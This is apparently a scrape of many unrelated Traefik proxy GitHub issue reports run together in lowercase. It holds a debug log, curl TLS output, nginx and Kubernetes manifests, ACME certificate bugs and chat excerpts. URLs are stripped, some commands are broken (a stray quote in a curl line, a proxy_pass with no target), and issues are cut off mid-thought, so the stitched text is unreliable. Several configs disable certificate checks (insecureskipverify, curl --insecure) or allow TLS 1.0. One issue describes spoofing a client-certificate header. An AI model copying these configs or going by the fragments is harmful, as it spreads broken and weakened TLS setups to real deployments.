debu[2019-09-27t14:03:37+03:00] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":10000000000},"gracetimeout":0,"debug":false,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"tracing":null,"loglevel":"debug","entrypoints":{"https":{"address":":451","tls":{"minversion":"versiontls10","ciphersuites":null,"certificates":[{"certfile":"certs/chainedsslcert.crt","keyfile":"certs/sslcert.key"}],"clientcafiles":null,"clientca":{"files":["certs/pdcca.crt"],"optional":false},"defaultcertificate":{"certfile":"certs/chainedsslcert.crt","keyfile":"certs/sslcert.key"},"snistrict":false},"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":true,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"allowminweightzero":false,"keeptrailingslash":false,"web":null,"docker":null,"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":{"watch":false,"filename":"","constraints":null,"trace":false,"templateversion":0,"debugloggeneratedtemplate":false,"clustermanagementurl":" ","apiversion":"3.0","refreshseconds":0,"tls":null,"appinsightsclientname":"","appinsightskey":"","appinsightsbatchsize":0,"appinsightsinterval":0},"rest":null,"api":null,"metrics":null,"ping":null,"hostresolver":null}
info[2019-09-27t14:03:37+03:00]
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data
warn[2019-09-27t14:03:37+03:00] clienttls is nil
debu[2019-09-27t14:03:37+03:00] adding certificate for domain(s) ...removed...
info[2019-09-27t14:03:37+03:00] preparing server https &{address::451 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
debu[2019-09-27t14:03:37+03:00] adding certificate for domain(s) ...removed...
info[2019-09-27t14:03:37+03:00] starting provider configuration.provideraggregator {}
info[2019-09-27t14:03:37+03:00] starting server on :451
info[2019-09-27t14:03:37+03:00] starting provider *servicefabric.provider {"watch":false,"filename":"","constraints":null,"trace":false,"templateversion":0,"debugloggeneratedtemplate":false,"clustermanagementurl":" ","apiversion":"3.0","refreshseconds":10000000000,"tls":null,"appinsightsclientname":"","appinsightskey":"","appinsightsbatchsize":0,"appinsightsinterval":0}
info[2019-09-27t14:03:47+03:00] checking service fabric config
debu[2019-09-27t14:03:47+03:00] backend fabric:/testfabricappp/web2app: no load-balancer defined, fallback to 'wrr' method
debu[2019-09-27t14:03:47+03:00] configuration received from provider servicefabric: {"backends":{"fabric:/testfabricappp/web2app":{"servers":{"132140537513631824":{"url":" ","weight":1}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-fabric:/testfabricappp/web2app":{"entrypoints":["https"],"backend":"fabric:/testfabricappp/web2app","routes":{"traefik.frontend.rule":{"rule":"pathprefix:/api"}},"passhostheader":true,"passtlscert":true,"priority":0,"basicauth":null}}}
debu[2019-09-27t14:03:47+03:00] adding certificate for domain(s) ...removed...
debu[2019-09-27t14:03:47+03:00] wiring frontend frontend-fabric:/testfabricappp/web2app to entrypoint https
debu[2019-09-27t14:03:47+03:00] creating backend fabric:/testfabricappp/web2app
debu[2019-09-27t14:03:47+03:00] adding certificate for domain(s) ...removed...
debu[2019-09-27t14:03:47+03:00] creating load-balancer wrr
debu[2019-09-27t14:03:47+03:00] creating server 132140537513631824 at with weight 1
debu[2019-09-27t14:03:47+03:00] creating route traefik.frontend.rule pathprefix:/api
info[2019-09-27t14:03:47+03:00] server configuration reloaded on :451
info[2019-09-27t14:03:57+03:00] checking service fabric config
debu[2019-09-27t14:03:57+03:00] backend fabric:/testfabricappp/web2app: no load-balancer defined, fallback to 'wrr' method
debu[2019-09-27t14:03:57+03:00] configuration received from provider servicefabric: {"backends":{"fabric:/testfabricappp/web2app":{"servers":{"132140537513631824":{"url":" ","weight":1}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-fabric:/testfabricappp/web2app":{"entrypoints":["https"],"backend":"fabric:/testfabricappp/web2app","routes":{"traefik.frontend.rule":{"rule":"pathprefix:/api"}},"passhostheader":true,"passtlscert":true,"priority":0,"basicauth":null}}}
info[2019-09-27t14:03:57+03:00] skipping same configuration for provider servicefabric
debu[2019-09-27t14:04:02+03:00] serving default cert for request: "localhost"
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/values\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"user-agent\\":[\\"curl/7.66.0\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"localhost:451\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:7350\\",\\"requesturi\\":\\"/api/values\\",\\"tls\\":null}"
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/values\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"user-agent\\":[\\"curl/7.66.0\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"localhost:451\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:7350\\",\\"requesturi\\":\\"/api/values\\",\\"tls\\":null}" forwardurl=" "
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/forward: begin servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"mypc:8473\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"user-agent\\":[\\"curl/7.66.0\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"localhost:451\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:7350\\",\\"requesturi\\":\\"/api/values\\",\\"tls\\":null}"
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/forward/http: begin servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"mypc:8473\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"user-agent\\":[\\"curl/7.66.0\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"localhost:451\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:7350\\",\\"requesturi\\":\\"/api/values\\",\\"tls\\":null}"
debu[2019-09-27t14:04:02+03:00] upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel.
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/forward/http: round trip: code: 200, length: 19, duration: 8.9822ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:localhost
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/forward/http: completed servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"mypc:8473\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"user-agent\\":[\\"curl/7.66.0\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"localhost:451\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:7350\\",\\"requesturi\\":\\"/api/values\\",\\"tls\\":null}"
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/forward: completed servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"mypc:8473\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"user-agent\\":[\\"curl/7.66.0\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"localhost:451\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:7350\\",\\"requesturi\\":\\"/api/values\\",\\"tls\\":null}"
debu[2019-09-27t14:04:02+03:00] vulcand/oxy/roundrobin/rr: completed servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/api/values\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"*/*\\"],\\"user-agent\\":[\\"curl/7.66.0\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"localhost:451\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:7350\\",\\"requesturi\\":\\"/api/values\\",\\"tls\\":null}"
info[2019-09-27t14:04:07+03:00] checking service fabric config
debu[2019-09-27t14:04:07+03:00] backend fabric:/testfabricappp/web2app: no load-balancer defined, fallback to 'wrr' method
debu[2019-09-27t14:04:07+03:00] configuration received from provider servicefabric: {"backends":{"fabric:/testfabricappp/web2app":{"servers":{"132140537513631824":{"url":" ","weight":1}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-fabric:/testfabricappp/web2app":{"entrypoints":["https"],"backend":"fabric:/testfabricappp/web2app","routes":{"traefik.frontend.rule":{"rule":"pathprefix:/api"}},"passhostheader":true,"passtlscert":true,"priority":0,"basicauth":null}}}
info[2019-09-27t14:04:07+03:00] skipping same configuration for provider servicefabric
info[2019-09-27t14:04:10+03:00] i have to go...
info[2019-09-27t14:04:10+03:00] stopping server gracefully
debu[2019-09-27t14:04:10+03:00] waiting 10s seconds before killing connections on entrypoint https...
debu[2019-09-27t14:04:10+03:00] entrypoint https closed
info[2019-09-27t14:04:10+03:00] server stopped
info[2019-09-27t14:04:10+03:00] shutting down
curl --cert cert.crt" --key cert.key --insecure -k -v
* uses proxy env variable no_proxy == 'localhost,127.0.0.*,mypc'
* trying ::1:451...
* tcp_nodelay set
* connected to localhost (::1) port 451 (#0)
* alpn, offering h2
* alpn, offering http/1.1
* tlsv1.3 (out), tls handshake, client hello (1):
* tlsv1.3 (in), tls handshake, server hello (2):
* tlsv1.2 (in), tls handshake, certificate (11):
* tlsv1.2 (in), tls handshake, server key exchange (12):
* tlsv1.2 (in), tls handshake, request cert (13):
* tlsv1.2 (in), tls handshake, server finished (14):
* tlsv1.2 (out), tls handshake, certificate (11):
* tlsv1.2 (out), tls handshake, client key exchange (16):
* tlsv1.2 (out), tls handshake, cert verify (15):
* tlsv1.2 (out), tls change cipher, change cipher spec (1):
* tlsv1.2 (out), tls handshake, finished (20):
* tlsv1.2 (in), tls handshake, finished (20):
* ssl connection using tlsv1.2 / ecdhe-rsa-aes128-gcm-sha256
* alpn, server accepted to use h2
* server certificate:
* subject: c=ru; st=moscow; l=moscow; o=..removed..; ou=it; cn=..removed..
* start date: sep 13 08:11:53 2019 gmt
* expire date: sep 12 08:11:53 2021 gmt
* issuer: c=ru; o=..removed..; cn=..removed..
* ssl certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
* using http2, server supports multi-use
* connection state changed (http/2 confirmed)
* copying http/2 data in stream buffer to connection buffer after upgrade: len=0
* using stream id: 1 (easy handle )
> get /api/values http/2
> host: localhost:451
> user-agent: curl/7.66.0
> accept: */*
* connection state changed (max_concurrent_streams == 250)!
< http/2 200
< content-type: application/json; charset=utf-8
< date: fri, 27 sep 2019 11:04:02 gmt
< server: kestrel
< content-length: 19
["value1","value2"]* connection #0 to host localhost left intact
```
i created an nginx proxy in front of traefik that uses the opentracing module
load_module modules/ngx_http_opentracing_module.so;
user nginx;
worker_processes 1;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;
events { worker_connections 1024;
http { opentracing on; opentracing_load_tracer /usr/local/lib/libzipkin_opentracing_plugin.so /etc/zipkin-config.json; default_type application/octet-stream; log_format main \'$remote_addr - $remote_user [$time_local] "$request" \' \'$status $body_bytes_sent "$http_referer" \' \'"$http_user_agent" "$http_x_forwarded_for"\'; access_log /var/log/nginx/access.log main; server { listen 443; ssl on; server_name i.trajano.net; ssl_certificate /cert.pem; ssl_certificate_key /key.pem; ssl_client_certificate /ca.pem; ssl_verify_client on; ssl_trusted_certificate /cert.pem; ssl_protocols tlsv1.3 tlsv1.2 tlsv1.1 tlsv1; ssl_prefer_server_ciphers on; ssl_ciphers eecdh+ecdsa+aesgcm:eecdh+arsa+aesgcm:eecdh+ecdsa+sha512:eecdh+ecdsa+sha384:eecdh+ecdsa+sha256:ecdh+aesgcm:ecdh+aes256:dh+aesgcm:dh+aes256:rsa+aesgcm:!anull:!enull:!low:!rc4:!3des:!md5:!exp:!psk:!srp:!dss; location / { # opentracing_trace_locations off; proxy_set_header host $host; proxy_set_header x-real-ip $remote_addr; proxy_set_header x-forwarded-for $proxy_add_x_forwarded_for; proxy_set_header x-forwarded-proto $scheme; proxy_pass } }
``` i can verify in zipkin that a trace is created by nginx
however, when i try to access a service that is managed by traefik, it appears to ignore nginx from the trace
example (requires certs to run) in noted in
we use f5 loadbalancer with health-check to the backend
health-check is a get request to url and by default it\'s http/1.0 request without "host: "
loadbalancer doesn't care that site replies, it cares only about backend node is alive, that's why the check is so simple.
it does work fine with traefik, except it throws a warning in logs for every request:
```level=warning msg="could not retrieve canonizedhost, rejecting "```
i looked at from where it comes from and it seems by the code this is because "host: " is not set and actual hostname is not known
i'm not sure this is actually routing or replying code, since everything actually works, and this query hits all the rules, routes and services set for it
just the warning is really spoiling the logs
we have three nodes in swarm as backend with logs unified, and loadbalancer polls them rapidly, so it's a message almost every second.
put traefik on digitalocean droplet behind digitalocean loadbalancer
enable proxyprotocol on the loadbalancer and set flag on traefik container `--entrypoints.web.proxyprotocol.insecure=true`
i'm building traefik v2.0 from source (v2.0.0 tag) for risc-v architecture
on versions after v2.0-rc3, traefik spins out with 100% cpu usage and accessing it's dashboard returns a loop of 502 error (cpu goes up to 200%)
the ingresses created by manifests work normally
i've build on another host by cross-compiling with an off-tree go 1.13 with `make generate-webui && ./script/generate && goos=linux goarch=riscv64 ./script/binary`
the directories `static` and `autogen` were removed between builds
using the exact same process of building, creating docker image and config, versions v2.0-rc1 and rc2 works as expected (no spinning and dashboard works) even after adding the parameter api.insecure=true, the cpu spins up although the dashboard is available.
upon swarmmoderefresh, traefik is recreating all routes, services, middlewares and resets health checks
```time="2019-09-18t06:03:18z" level=debug msg="creating middleware" entrypointname=uu middlewarename=metrics-entrypoint middlewaretype=metrics
time="2019-09-18t06:03:18z" level=debug msg="creating middleware" entrypointname=traefik middlewarename=metrics-entrypoint middlewaretype=metrics
time="2019-09-18t06:03:18z" level=debug msg="creating middleware" middlewarename=metrics-entrypoint middlewaretype=metrics entrypointname=http
time="2019-09-18t06:03:18z" level=debug msg="initial health check for backend: \\"oo@docker\\""
time="2019-09-18t06:03:18z" level=debug msg="initial health check for backend: \\"pp@docker\\""
time="2019-09-18t06:03:18z" level=debug msg="creating tcp server 0 at 10.0.2.228:873" servername=0 entrypointname=uu routername=rsyncd@docker servicename=uu
time="2019-09-18t06:03:18z" level=debug msg="creating tcp server 1 at 10.0.2.223:873" routername=uu@docker servicename=uu servername=1 entrypointname=uu
```
updated traefik from 1.7.14 to 1.7.16
my setup : - 1 traefik and 2 backend servers - both backend servers are running a service written in go (application is compiled with go 1.12.9)
- there is a steady stream of traffic hitting traefik from both http/1.1 and http/2 clients
the new dashboard in 2.0 does not seem to handle being put behind a `pathprefix`
more specifically, the frontend continues to look for assets in `/dashboard` instead of `/traefik/dashboard`
configuration: ```toml
[http.routers] [http.routers.api] entrypoints = ["http"] rule = "hostregexp(`systems.{tld:[a-z0-9.-]+}`) && pathprefix(`/traefik`)" service = "api@internal" middlewares = ["adminauth", "traefikacp", "securityheaders"] [http.middlewares] [http.middlewares.traefikacp.stripprefix] prefixes = ["/traefik"]
``` generated html: ```html
<script type="text/javascript" src="/dashboard/js/app.b1a5516b.js"></script>
<script type="text/javascript" src="/dashboard/js/vendor.bf460595.js"></script>
i got letsencrypt working now, but i noticed something was off in that when i restart the server it appears to recreate the certificate again
the commands i am using to configure traefik are: - --certificatesresolvers.default.acme.httpchallenge.entrypoint=http - --certificatesresolvers.default.acme.email=support@trajano.net - --certificatesresolvers.default.acme.storage=/letsencrypt/acme.json i have this volumes block on the service volumes: - letsencrypt:/letsencrypt to correspond to the following in the top level compose file:
volumes: letsencrypt:
``` i see the volume when i do `docker volume ls` but when i try to view it's contents it is empty using this command docker run -it -v edge_letsencrypt:/mnt bash ls -la //mnt
just follow version 2.0 documentations
i updated from 1.7.13 to version 1.7.14 of traefik
then run a tls check ( and suddenly got a rating downgrade from a+ of b
i was trying to set up an ssl termination for an http backend service which partially uses websocket connections.
while testing v2.0.0-rc2 i tried to reproduce my current setup and came up with the provided config below (only the relevant bits are given for briefness)
on the initial run, i got the provided errors
i checked my dns setup, but i was unable to see any acme txt records
i then tried to remove the `tls` settings from one of the routers, and certificate was generated
upon returning the settings, and restarting, no errors were reported and all routers had the same certificate
so it seems that this only manifests when you try to request the same certificate for multiple routers.
[very good illustration]( of very related problem.
i have 2 ingress routes with kubernetescrd provider.
first service expected to have ordinary le and https.
second service expected to be served only with mutual tls (mtls) my k8s definitions:
apiversion: extensions/v1beta1
kind: deployment
metadata: name: meow
spec: replicas: 1 selector: matchlabels: app: meow template: metadata: labels: app: meow spec: containers: - name: meow image: gcr.io/kubernetes-e2e-test-images/echoserver:2.1 ports: - containerport: 8080 ---
apiversion: v1
kind: service
metadata: name: meow-svc
spec: ports: - port: 80 targetport: 8080 protocol: tcp name: http selector: app: meow ---
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: meow-svc-https
spec: entrypoints: - https routes: - match: host(`meow.example.com`) kind: rule services: - name: meow-svc port: 80 middlewares: - name: test-header - name: passtlsclientcert tls: options: name: tls-with-client-verification ---
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: meow-svc-https-without-mtls
spec: entrypoints: - https routes: - match: host(`without-mtls.example.com`) kind: rule services: - name: meow-svc port: 80 middlewares: - name: test-header - name: passtlsclientcert ## doesn't require mtls tls: {} --- apiversion: traefik.containo.us/v1alpha1
kind: tlsoption
metadata: name: tls-with-client-verification labels: app: traefik chart: traefik-0.0.1 release: "traefik" heritage: "tiller"
spec: minversion: "versiontls12" ciphersuites: [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha256" ] snistrict: true clientauth: secretnames: - my-tls-secret clientauthtype: "requireandverifyclientcert" ---
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: passtlsclientcert
spec: passtlsclientcert: pem: true
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: test-header
spec: headers: customrequestheaders: x-script-name: "added-by-testheader" customresponseheaders: x-custom-response-header: "added-by-testheader" ``` test case 1
curl --cert mtls/client.crt --key mtls/client.key 2>&1 | grep -i 'x-forwarded-tls-client-cert'
# gives out:
# x-forwarded-tls-client-cert=miie ............
%3d curl
# gives out:
# curl: (56) openssl ssl_read: error:14094412:ssl routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0 ``` test case 2
my chrome browser doesn't have client certificates/keys.
i open my first service `without-mtls.example.com` (that does not require certs) in my chrome browser (make valid ssl handshakes and tcp connection over http2) and after that, i open second `meow.example.com` page (that requires certs)
same behaviour with firefox.
try to load an incomplete/invalid private key to acme configuration
started up a docker version with the lastest release candidate
followed the documentation on ro run traefik 2 ok a k3s configured master & 1 node configuration.
i have a small nginx that i ocassionally take "offline" by deliberately failing the health check, which works with traefik 1.7.12 but no longer in v2.0
i have configured the health check as below and *see* the health check in the nginx log giving a `404`, but even then, the server is still available
am i missing something?
enabled serverstransport.insecureskipverify: true
netflix has published an [advisory]( about multiple vulnerabilities on http/2 that causes various denials of service
go has already published an updated version (1.12.8) that addresses those vulnerabilities
note that this version introduces an [incompatibility]( with the url parser
caddy addresed this on their [update]( today, not sure is this applies to traefik too
traefik needs to be recompiled with go 1.12.8 and optionally address the url.parse incompatibility.
i'm evaluating ipv6 on the traefik nodes and found the following issue:
i have the following redirection set in my `http` entrypoint in order to redirect all requests to https
``` [entrypoints.http.redirect] entrypoint = "https"
i have installed phpmyadmin using this helm chart:
this chart has this annotation by default:
ingress.kubernetes.io/rewrite-target: /
i have a grpc backend with bidi streams and keep alive server parameters ```go
keepaliveparams = keepalive.serverparameters{ maxconnectionidle: 20 * time.minute, // if a client is idle for given duration, send a goaway
maxconnectionage: 20 * time.minute, // if any connection is alive for more than given duration, send a goaway
maxconnectionagegrace: 10 * time.second, // allow given duration for pending rpcs to complete before forcibly closing connections time: 10 * time.second, // ping the client if it is idle for given duration to ensure the connection is still active
timeout: 2 * time.second, // wait given duration for the ping ack before assuming the connection is dead.
srv := grpc.newserver(grpc.keepaliveparams(keepaliveparams))
srv.serve()
``` also i have grpc client which connects to the server and calls some bidi stream.
since i have grpc keep alive server parameters i want my client to be pinged in given time interval.
as our let's encrypt certificate expired i investigated that there is a problem with the dns-challenge provider we use.
per the discussion in the discourse "traefik v2" topic [_kubernetes ingress annotation doesn\'t force https to backend pods_]( [the three ways supported by earlier versions of traefik]( #tls-communication-between-traefik-and-backend-pods) to indicate that a kubernetes _ingress_ object requires https communication don\'t work properly in traefik version 2 (as of version 2.0.0-beta1)
the only method that works as advertised is detecting that a kubernetes _service_ port has a name and the name starts with "https." suppose you have a kubernetes _ingress_ object pointing at a _service_ for which the backing server pods speak https
you want traefik to use https for its proxy connections to these upstream servers
if your _service_ port either lacks a name or has a name that doesn\'t start with "https," you want to fall back to one of the other two methods that used to work in earlier versions of traefik
first, the _ingress_ annotation "ingress.kubernetes.io/protocol" with a value of "https" would allow you to request use of https regardless of your _service_ ports; neither the name nor the port value should matter
traefik no longer honors this annotation
however, if your _service_ port ot the target port on the backing pod container, but rather the port on which the _service_ listens to receive connections s 443, and if that port is selected by the _ingress_ rule, then traefik should use https
traefik _tries_ here, but gets the implementation wrong.
created the following ingress: ```yaml
apiversion: networking.k8s.io/v1beta1
kind: ingress
metadata: name: test namespace: default
spec: tls: - secretname: secret rules: - host: traefik.rocks http: paths: - path: /test backend: servicename: service serviceport: 443 ``` with a valid tls certificate in the referenced secret
kubernetesingress provider enabled (obvs)
after a load test on an app behind traefik, we see a lot a memory used by traefik, and not free after perf test
sometimes, our traefik container growth to the hard memory limit and is killed
the perf test is about websocket connections
i found some issues but they seem to be already ok in version 1.7.12 that we used
we got 3 traefik instances, and each is growing to 800mo ram for 15000 websocket connections
context: docker swarm, 3 traefik instances, nodejs websocket backend this is the graph of memory usage over the test, here 100% = 1gb ram
we can see the 3 traefik replicas
when 100% is reach, linux kernel kill the containers (hard limit)
![image](
using v1.7.12 on azure service fabric
i'd like traefik to add cache-control header to the responses of certain requests from a web app which is also deployed to the cluster
the way i found this can be done is to create 2 separate services with different frontend routing rules for my application
the final result would be something like this: ```
host:devmachine.localhost;pathprefix:/
which adds "_cache-control: no-cache_" response header
host:devmachine.localhost;path:/{url:(.*)\\.(js|css)}
which adds "_cache-control: max-age=86400_" response header.
i enabled buffering of requests using this configuration on one of my backends: `traefik.backend.buffering.retryexpression=isnetworkerror()&&attempts()<=2` this backend is serving up some very large responses that can be gb's in size, so it writes them to disk to temporary files
sometimes these files are not cleaned up, weeks after the original request was made
note: i added a write timeout value of `24h` to make sure that these weren't just long running requests, but it didn't help
use `from golang:1.13-rc-alpine` in the `build.dockerfile` and run integration tests with `make test-integration`
followed the documentation on ro run traefik 2 ok a k3s configured single machine
i'm using traefik as ingress reverse proxy for kubernetes and having services which can pass websocket messages up 128kb
unfortunately traefik use defaults for buffer size from gorilla, which just 4kb
this issue was reported almost 1y ago with #3538, but closed without any attention, because robots told so
odd approach, btw.
use an http client to send x-forwarded-ssl-client-cert-infos header without presenting a valid client certificate
a backend can't trust this header because a client can send in a header without presenting a valid client certificate.
we have ~80 different subdomains, all with let's encrypt certificates
they are using the dns challenge with route53
our websites are served with a 3-instances traefik cluster, deployed in "global mode" on our **docker swarm** across several machines
there is a global consul kv store
our configuration is very similar from [the one provided in the docs]( #full-docker-compose-file_1)
suddenly, traefik began to serve the wrong certificate for one of our subdomains
here was the situation: - ` ` was working as usual, with https
- ` ` was working, but served with the `app.sub1.example.com` certificate
(web browsers showed a full-screen warning.) we inspected the consul storage (`consul kv get traefik/acme/account/object | gzip -dc` and found the following: ```
{ "domains": { "main": "app.sub1.example.com", "sans": null }, "certificate": { "domain": "app.sub1.example.com", "certurl": " ", "certstableurl": " ", "privatekey": "redacted-private-key-1", "certificate": "redacted-certificate-1" }
{ "domains": { "main": "app.sub2.example.com", "sans": null }, "certificate": { "domain": "app.sub1.example.com", "certurl": " ", "certstableurl": " ", "privatekey": "redacted-private-key-1", "certificate": "redacted-certificate-2" }
``` according to [crt.sh]( traefik tried to renew the `app.sub1.example.com` certificate a few seconds before our monitoring informed us of the problem
somehow, it successfully managed to renew the certificate with let's encrypt, but put it in the `app.sub2.example.com` configuration
the `app.sub1.example.com` certificate has **not** been changed, as we saw its "not before" date is 2 days before the one in `app.sub2.example.com`
note: the `app` part is common in both subdomains, it's the same string.
patch the docker ucp manager
tried to verify https support was working with traefik by using the default certificate generation before considering to generate with letsencrypt.
upgraded from 1.7.11 to 1.7.12
examined the let's encrypt server-side logs for instances of the error: ```
400 :: malformed :: error finalizing order :: cn was longer than 64 bytes
``` this error occurs when an invalid csr is delivered to the acme v1 `new-cert` endpoint, or the acme v2 `finalizeorder` endpoint
[rfc 5280 ]( appendix a1 specifies that the upper bound on the common name length (`ub-common-name-length`) is 64 bytes:
> ub-common-name-length integer ::= 64 the [ca/b requirements]( mandate rfc 5280 compliance and so let's encrypt must reject csrs with an improperly sized cn
the modern subject alternative name (san) fields do not have this restriction and can accommodate longer domain names.
> dalan [today at 1:11 pm]
> getting an error on the new `2.0.0-alpha6`
> > traefik | 2019/06/20 13:09:38 command /traefik error: entrypoints cannot be a standalone > element (type static.entrypoints)
> > this is my `traefik.toml` file
> > > [entrypoints]
> [entrypoints.http]
> address = ":80"
> > [entrypoints.https]
> address = ":443"
> > it appears the docs haven't changed for defining entrypoints, so i'm not sure what's going wrong
it'd be super useful if the line the parse error bailed out on was logged
> 12 replies
> ldez [11 minutes ago]
> @dalan could you try to remove the first `[entrypoints]` ? (edited)
> dalan [9 minutes ago]
> that was it :+1:
> dalan [9 minutes ago]
> now getting `field not found node: domain`
> ldez [8 minutes ago]
> give me your configuration
> dalan [8 minutes ago]
> ooc where is the toml file being used for tests?
> ldez [8 minutes ago]
> in the majority of the integration tests
> ldez [5 minutes ago]
> could you give me more information about your run and configure?
> ldez [4 minutes ago]
> docker-compose file, toml file, ...
> dalan [4 minutes ago]
> #l8
> dalan [3 minutes ago]
> shouldn't the tests have failed for `alpha6` if parsing the above? (edited)
> ldez [2 minutes ago]
> we have a regression on file parsing, could you open an issue thanks
i will fixed that asap (edited)
> dalan [1 minute ago]
> can do! thanks as always for your help @ldez :pray:
services: traefik: deploy: ..
